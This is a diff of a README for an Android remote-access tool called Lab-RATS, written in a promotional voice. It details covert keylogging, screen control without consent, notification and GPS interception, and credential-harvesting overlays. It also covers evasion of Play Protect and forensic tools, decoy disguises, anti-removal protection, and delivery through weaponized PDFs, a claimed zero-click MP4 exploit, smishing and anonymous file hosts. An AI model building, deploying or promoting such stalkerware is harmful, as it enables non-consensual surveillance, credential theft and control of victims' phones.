@@ -13,14 +13,14 @@
   <img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge&logo=opensourceinitiative&logoColor=white">
 </p>
 
-# Lab-RATS - v1.6.0
-> Lightweight Android-Built Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*
+# Lab-RATS - v1.6
+> Lightweight Android-Based Remote Administration Tool for Security: *(L.A.B. - R.A.T.S)*
 
 **Lab-RATS is an open-source, lightweight Android Remote Administration framework** packed with powerful **monitoring** and **interaction capabilities**. The system automates the generation of custom, signed `.apk` files for **deployment onto any Android device**, providing full device telemetry via a **sleek, web-based C2 dashboard**. Built to adapt to **strict modern mobile environments**, it delivers a **robust feature suite** that **operates reliably** across both **legacy** and the **newest Android releases**.
 
 ---
 
-## 🌎 Direct IPv6 Access *(P2P connection)*:
+## 🌎 Direct IPv6 Access: *(P2P connection)*
 
 **Lab-RATS leverages the unique characteristics of publicly routable IPv6 addresses assigned by modern Wi-Fi and cellular *(5G/LTE)* carriers**. By **binding the control server directly to a device's Global Unicast Address** *(GUA)*, the tool **completely bypasses Carrier-Grade NAT** *(CGNAT)* and **inbound firewall restrictions**. This architecture **enables seamless, Zero-Configuration peer-to-peer** *(P2P)* **remote access from any modern web browser worldwide**—completely eliminating the need for **router manipulation, port forwarding**, or **third-party tunneling services** like **Ngrok** or **Pinggy**.
 <details>
@@ -33,46 +33,41 @@
 
 ## 🛡️ Core Features & Security
 
-### 🔐 **Remote C2 Security** & **Secure Handshake**:
+### 🔐 Remote C2 Security & Secure Handshake:
 - The **web dashboard** is **protected by a secure login wall** (**Default Password: admin1337**). The password can be **changed directly from the Terminal home page** for **enhanced security**.
 - Implemented a **masked credential handshake**. Passwords are **reversed and Base64 encoded** (`0x_` prefixed) on the client-side before transmission, rendering them **invisible to browser Network/Payload inspectors**.
 
-### 📦 **Automated APK Generation, Identity Control & Density Scaling**:
+### 📦 Automated APK Generation, Identity Control & Density Scaling:
 - **Instantly build** `signed.apk` for **production** and **testing**.
 - **Fully** customize **App Name**, **Package ID**, and **Minimum SDK**.
 - **Resize logos automatically** for **all Android screen densities**.
 
-### 📱 **PC/Mobile Responsive**:
+### 📱 PC/Mobile Responsive:
 - The **remote web interface** is **fully optimized** for **both PC** and **smartphone browsers**, featuring a **touch-friendly layout, adaptive navigation tabs**, and **scalable UI elements** for monitoring **from any device**.
 
 ---
 
 ## 🕵️ Covert Operations & Stealth Management
 
-### 💉 **NEW!** **Payload Delivery Vectors** *(Installing APK onto Target Device)*:
+### 💉 Payload Delivery Vectors: *(Installing APK onto Target Device)*
 - The **Weaponization Engine** has been **overhauled to support multiple high-success delivery methods** *(Stealth PDF, Zero-Click MP4, Meeting Invite and Many More)*, **ensuring reliable access** across **all modern mobile environments**.
 
-### 🛡️ **Evasion Engine**:
+### 🛡️ Evasion Engine:
 -  **Undetectable by Samsung Knox**, **McAfee** and **Google Play Protect**.
 -  **Deep Stealth HTML Shield**: The C2 interface utilizes **Shadow DOM Cloaking** and **Base64 Payload Wrapping**. Browser "Elements" inspection is **zeroed-out**, and the tactical structure is **ghosted from analysts**.
 -  **Web Hardening**: Assets *(JS/CSS)* are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** *(Right-Click, F12)* to **prevent unauthorized analysis**.
 - **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow** and **class names via ProGuard/R8 integration**.
 - **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.
 
-### 🎭 **Stealth App Decoys**:
+### 🎭 Stealth App Decoys:
 **Remotely swap the entire Lab-RATS app identity and icon instantly** using **the "Masquerade Library"** of convincing **Fully Functional Clones**:
 - 👀 **System Update** *(Default)*: **Used for initial install** it **simulates a system update** and **prompts for permissions during the process**, achieving **highly successful installs**.
 - 🧮 **Calculator**: Performs **actual math** with a **tactical logic engine**.
 - 🌦️ **Weather App**: Displays **real-time localized forecasts** via **Open-Meteo API**.
 - 🛡️ **Play Protect**: Simulates **a legitimate security scan** to **build target trust**.
 - 🐭 **Lab-Rats & System Stability Services**: **Completely unmasked** and **directly opens** the C2 server interface on device.
-<details>
-  <summary>📸 Click to View Stealth App Decoys</summary>
-  <br>
-  <img src="https://github.com/user-attachments/assets/f2114dda-1090-4395-add2-6007f48cff8f" alt="Full Web Page Screenshot" width="50%">
-</details>
 
-### ☎️ **Emergency Recovery** & **Self Healing**:
+### ☎️ Emergency Recovery & Self Healing:
 - **Dialer Unlock**: Type `*#1337#` on the **phone's keypad** to **unmask the Lab-RATS server interface back into view**.
 - **Hidden Backdoor**: If the **device is in stealth mode**, **rapidly tap the middle of the decoy screen 10 times** to **unlock the C2 server interface**. *(Reverts to stealth mode again once app is closed)*
 - **Automatically detects** and **repairs damaged service bindings** or **revoked permissions in the background**.
@@ -82,7 +77,7 @@
 - **Web UI**: **One-click "RESTART_SERVER" button** on the **Terminal tab** to **refresh background services**.
 - **SMS Backdoor**: Send an **SMS/Text containing `!RESTART_C2`** to the **devices number** to **force the server back online** even if it was **manually closed or killed by the OS**.
 
-### 👻 **Task-List Ghosting** & **Dynamic OTA Camouflage**:
+### 👻 Task-List Ghosting & Dynamic OTA Camouflage:
 - The app is **hard-coded** to be **invisible in the Android "Recent Apps" list**.
 - Generates **random version names and codes** that **mimic legitimate system OTA updates**.
 
@@ -93,25 +88,25 @@
 ### 👻 Ghost_Operations:
 - **Ghost Control/Live Feed**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**.
 - **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **NON-masked live remote feed**. *(Pair with Ghost Control for maximum stealth)*
-- **NEW! Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to overwhelm the device.
-- **NEW! Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
+- **Ghost_Toast**: Remotely deploy **tactical, persistent pop-up overlays** with **fully customizable text** *(color, size, and screen positioning)*. Features **multiple animation styles** *(pop, static, and side-scroll)* alongside a **high-intensity "Burnt_Toast" mode** that **floods the screen with randomized pop-ups** to overwhelm the device.
+- **Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
 - **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
 
-### 🧪 NEW! Exploit_Factory:
+### 🧪 Exploit_Factory:
 - **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
 - **QR Visual Vector**: Dedicated **high-density QR code generator** for independent URL delivery.
 - **Smishing Library**: Pre-configured **tactical phishing templates** with **automated C2 link injection**.
 - **Shadow Overlay**: Remotely **inject functional, pixel-perfect credential-harvesting overlays** to the device.
 
-### 💀 Anti-Removal Shield (Optimized):
+### 💀 Anti-Removal Shield *(Optimized)*:
 - **High-speed, event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the **app**.
 - **Suicide Protocol (Self-Destruct)**: **Remote-triggered persistent loop** that **wipes all local configuration** and initiates a **hard uninstallation of the C2 core**.
 
-### 🛰️ Precision GPS Tracking & Intel Stream (Notification Sniffer):
+### 🛰️ Precision GPS Tracking & Intel Stream *(Notification Sniffer)*:
 - **One-click uplink** to open the **devices exact real-time location** in **Google Maps**.
 - **Intercept every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a **live feed**.
 
-### 📸 Tactical Surveillance Hub (Ultra-Stability):
+### 📸 Tactical Surveillance Hub *(Ultra-Stability)*:
 - **Covert Recording**: **Stealthily record video without any user-facing activity**.
 - **Snap Photos**: **Covert image capture** integrated into the **live stream**.
 - **Nightmode V2**: Aggressive **electronic brightening** for **low-light environments**. Now features **Hardware Breathe Sync** and **AE Bypass** for **zero-freeze operation** on **modern high-latency sensors**.
@@ -156,7 +151,7 @@ termux-reload-settings
 
 **Lab-RATS** supports **two primary methods** for **tracking your device fleet** and **receiving remote data**.
 
-### ☝🏻 Option 1: Google Sheet (Updated)
+### ☝🏻 Option 1: Google Sheet *(Updated)*
 **Best for basic IP tracking** and **logging**. **No server maintenance required**.
 
 1.  **Create** a new <a href="https://docs.google.com/spreadsheets/u/0/" target="_blank">Google Sheet</a>.
@@ -216,7 +211,7 @@ function handleRequest(e) {
 
 ---
 
-### ✌🏻 Option 2: Tactical Node.js Backend (Advanced)
+### ✌🏻 Option 2: Tactical Node.js Backend *(Advanced)*
 **Best for professional fleet management** and **Automatic File Exfiltration**.
 
 **Quick Deployment on Render** (https://render.com)
@@ -225,27 +220,56 @@ function handleRequest(e) {
 <br>**2. Set the Root Directory** to c2-server.
 <br>**3. Set the Build Command** to `npm install`.
 <br>**4. Set the Start Command** to `npm start`.
-<br>**5. Deploy!** Once live, **copy your Render URL** (e.g., https://labrats-c2.onrender.com), then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL**.
+<br>**5. Deploy!** Once live, **copy your Render URL** *(e.g., https://labrats-c2.onrender.com)*, then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL**.
+
+<details>
+  <summary>📸 Click to View Render C2 Screenshot</summary>
+  <br><p align="center">
+  <img src="https://github.com/user-attachments/assets/a1d9f43e-ca61-41da-a856-fa8846fe8b44" alt="Full Web Page Screenshot" width="80%">
+</details>
 
 **Advantages of Option 2**:
-- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, enabling **seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks**.
+- 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks**.
 - 📂 **Exfiltration Vault**: **Audio/Video recordings** are automatically uploaded and **stored on your server**.
-- 📡 **Live Fleet List**: A **professional glass-morphism dashboard** to **manage all "Rats" in one place**.
-- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your P2P links **are always up-to-date**.
+- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition**.
+- 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your **P2P links are always up-to-date**.
 
+---
+
+## 📋 System Requirements & Prerequisites
+
+To **build, compile**, and **deploy Lab-RATS** or **host the C2 server**, ensure **your environment meets the following requirements**:
+
+### 1. Workstation & Build Requirements: *(For Building APKs)*
+* **Java Development Kit (JDK)**: **JDK 17 or JDK 21** *(JDK 21 recommended)*.
+  * Ensure `JAVA_HOME` is set in your environment paths.
+* **Android SDK**: **Android SDK 34** *(API Level 34)* or higher.
+  * **Build-Tools**: Version `34.0.0` or higher *(includes `aapt2`, `zipalign`, and `apksigner`)*.
+* **Python 3.x**: Required for **Option 7: Smali Surgery & APK Binder** *(`binder.py`)*.
+* **Gradle**: Handled automatically via the included `./gradlew` *(Gradle 8.10+)*.
+
+### 2. C2 Server Hosting Requirements: *(For Option 2: Render / Railway)*
+* **Node.js**: **v18.0.0** or higher.
+* **npm**: **v9.0.0** or higher.
+* **Render / Linux Hosting**: 512 MB RAM minimum *(Render Free Tier supported)*.
+
+### 3. Target Android Device Compatibility:
+* **Minimum OS**: **Android 5.0** *(Lollipop / API 21)* or **higher**.
+* **Target OS**: **Android 14 - 16** *(API 34 - 36)* **fully supported**.
+* **Supported Devices**: **Samsung, Google Pixel, OnePlus, Xiaomi, Motorola, HTC, LG**, and **generic Android devices/emulators**.
+
+### 4. Operating System Compatibility:
+* 🐧 **Linux**: **Kali Linux, Ubuntu, Debian, Arch** *(Full support for build scripts & C2 server)*.
+* 🍎 **macOS**: **macOS Monterey / Ventura / Sonoma / Sequoia** *(Intel & Apple Silicon M1/M2/M3/M4)*.
+* 🪟 **Windows**: **Windows 10 / 11 via PowerShell, Command Prompt**, or **WSL2**.
 
 ---
 
 ## 🛠️ Get Started
 
-### 1. Requirements
-*   **Java 17 or 21 installed** on your **workstation**.
-*   A **Test Android device**. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
-*   Your **Google Sheet Webhook URL or Render URL**. *(previous sections above)*
-
-### 2. Building the APK (on PC)
-1.  **Download the Repo**: `git clone https://github.com/K4N3CO/Lab-RATS.git`
-2.  **Navigate** to: `cd /Lab-RATS/apk-builder/`
+### 1. Building the APK (on PC)
+1.  **Download the Repository**: `git clone https://github.com/KAN3C0/Lab-RATS-v1.6.git`
+2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
     *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
     *   **Windows**: `build.bat`
@@ -253,12 +277,12 @@ function handleRequest(e) {
     *   **Option 1 (Manual)**: For **basic configuration** of **App Name, ID**, and **Logo** before **building**.
     *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
 5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting**.
-6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `Lab-RATS/apk-builder/output/` **directory**.
+6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `Lab-RATS-v1.6/apk-builder/output/` **directory**.
 
-### 3. Deploying & Installing onto Android Devices
+### 2. Deploying & Installing onto Android Devices
 **Deployment** is **a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
-#### A. NEW! Strategic Weaponization (The Wrapper)
+#### A. Strategic Weaponization: (The Wrapper)
 **Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to wrap your link inside a **high-compatibility carrier file**:
 *   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
 *   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
@@ -266,11 +290,11 @@ function handleRequest(e) {
 *   **🔳 QR Code / 📡 NFC**: **Best for physical placement** or **"Tap-to-Infect" proximity delivery**. Generates a **high-density QR** or **NDEF record** pointing to the **hardened delivery URL**.
 *   **and Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.
 
-#### B. Hosting Strategies
+#### B. Hosting Strategies:
 *   **Anonymous Cloud**: **Option 6** uses **Catbox.moe by default**. It is **anonymous, fast**, and **generates a direct link**. Now includes **fallback upload to Litterbox and tmpfiles** if needed.
 *   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.
 
-#### C. Installation & Initialization
+#### C. Installation & Initialization:
 Once the **Target device** downloads the **APK**:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed.apk`
 2.  **Permissions (CRITICAL)**: **Open the app ONCE**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
